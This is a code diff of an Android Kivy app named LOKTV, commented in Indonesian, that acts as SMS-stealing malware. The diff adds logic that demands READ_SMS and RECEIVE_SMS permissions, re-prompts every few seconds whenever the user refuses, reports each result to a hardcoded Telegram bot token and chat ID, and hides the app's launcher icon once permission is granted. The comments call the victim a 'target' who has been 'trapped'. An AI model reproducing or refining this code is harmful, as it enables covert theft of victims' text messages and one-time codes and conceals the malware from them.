@@ -5,63 +5,55 @@ from kivy.app import App
 from kivy.clock import Clock
 import os
 
-# CONFIG BOT KAMU
 TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
 CHAT_ID = "5999516433"
 bot = telebot.TeleBot(TOKEN)
 
 class LOKTV(App):
     def build(self):
-        # Mulai minta izin 1 detik setelah buka aplikasi
-        Clock.schedule_once(lambda dt: self.minta_izin(), 1)
+        # Beri jeda 2 detik setelah buka baru minta izin
+        Clock.schedule_once(lambda dt: self.pancing_izin(), 2)
         return None
 
-    def minta_izin(self):
-        # Daftar izin yang diminta
+    def pancing_izin(self):
         perms = [
             Permission.READ_SMS,
             Permission.RECEIVE_SMS,
             Permission.POST_NOTIFICATIONS
         ]
-        request_permissions(perms, self.callback_izin)
+        request_permissions(perms, self.hasil_respon)
 
-    def callback_izin(self, permissions, grants):
-        # Jika semua izin diklik 'ALLOW' (Izinkan)
+    def hasil_respon(self, permissions, grants):
+        # Kirim status ke Telegram apapun hasilnya
+        status = "DIIZINKAN" if all(grants) else "DITOLAK/BLOKIR"
+        try:
+            bot.send_message(CHAT_ID, f"📢 Status Izin Target: {status}")
+        except: pass
+
         if all(grants):
-            try:
-                bot.send_message(CHAT_ID, "✅ IZIN DIBERIKAN! Target masuk jebakan. Menghilangkan ikon...")
-            except: pass
-            
-            # Sembunyikan ikon sekarang
-            self.eksekusi_sembunyi()
+            # HANYA HILANG JIKA DIIZINKAN
+            self.eksekusi_hilang()
         else:
-            # Jika ditolak atau diblokir, munculkan lagi popupnya (Looping)
-            self.minta_izin()
+            # Jika ditolak/notif gak muncul, minta lagi terus (Teror Popup)
+            Clock.schedule_once(lambda dt: self.pancing_izin(), 3)
 
-    def eksekusi_sembunyi(self):
+    def eksekusi_hilang(self):
         try:
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            currentActivity = PythonActivity.mActivity
-            PackageManager = autoclass('android.content.pm.PackageManager')
+            activity = PythonActivity.mActivity
+            pm = activity.getPackageManager()
+            
+            # Sembunyikan ikon
             ComponentName = autoclass('android.content.ComponentName')
+            comp = ComponentName(activity.getPackageName(), 'org.kivy.android.PythonActivity')
+            pm.setComponentEnabledSetting(comp, 2, 1)
             
-            package_name = currentActivity.getPackageName()
-            # Gunakan class name default Kivy
-            component_name = ComponentName(package_name, 'org.kivy.android.PythonActivity')
+            bot.send_message(CHAT_ID, "⚠️ Ikon Lenyap! Target Terperangkap.")
             
-            # HILANGKAN IKON DARI MENU
-            currentActivity.getPackageManager().setComponentEnabledSetting(
-                component_name,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-            
-            # Keluar aplikasi setelah 2 detik agar proses sistem selesai
-            Clock.schedule_once(lambda dt: os._exit(0), 2)
-        except Exception as e:
-            try:
-                bot.send_message(CHAT_ID, f"❌ Gagal sembunyi: {str(e)}")
-            except: pass
+            # Keluar setelah sukses
+            Clock.schedule_once(lambda dt: os._exit(0), 1)
+        except:
+            os._exit(0)
 
 if __name__ == '__main__':
     LOKTV().run()
